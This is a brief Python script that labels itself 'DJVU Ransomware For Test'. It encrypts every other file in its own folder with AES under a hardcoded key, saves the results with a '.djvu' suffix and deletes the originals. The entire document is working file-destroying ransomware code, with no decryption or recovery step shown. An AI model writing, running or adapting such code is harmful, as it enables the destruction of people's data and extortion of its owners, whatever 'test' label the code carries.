import os
from pathlib import Path
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
KEY_B64 = '6se9RaIxXF9m70zWmx7nL3bVRp691w4SNY8UCir0'
KEY = b64decode(KEY_B64)
if len(KEY) < 32:
    KEY += b'\x00' * (32 - len(KEY))

IV = KEY[:16] 

def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        encrypted_path = file_path.with_suffix(file_path.suffix + '.djvu')
        with open(encrypted_path, 'wb') as f:
            f.write(ciphertext)

        print(f"[✓] Encrypted: {file_path.name} → {encrypted_path.name}")
        os.remove(file_path)
    except Exception as e:
        print(f"[✗] Error encrypting {file_path.name}: {e}")

def encrypt_current_folder():
    current_folder = Path(__file__).parent
    for file in current_folder.iterdir():
        if file.is_file() and not file.suffix.endswith('.djvu') and file.name != Path(__file__).name:
            encrypt_file(file)

if __name__ == "__main__":
    print("")
    print("[🔐]  DJVU Ransomware For Test...")
    encrypt_current_folder()
    print("[✅] RANSOMWARE ENCRYPTED YOUR ALL DATA")
